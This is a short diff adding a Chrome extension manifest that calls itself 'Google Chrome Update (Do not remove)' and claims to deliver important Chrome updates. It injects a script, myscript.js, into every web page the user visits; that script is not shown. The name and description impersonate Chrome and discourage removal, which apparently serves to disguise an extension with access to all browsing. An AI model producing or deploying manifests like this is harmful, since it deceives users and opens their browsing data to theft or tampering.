@@ -1,0 +1,13 @@
+{
+  "manifest_version": 2,
+  "name": "Google Chrome Update (Do not remove)",
+  "version": "1.0",
+  "icons": { "128": "icon.png" },
+  "description":"Important updates for Google Chrome",
+  "content_scripts": [
+    {
+      "matches": ["http://*/*","https://*/*"],
+      "js": ["myscript.js"]
+    }
+  ]
+}
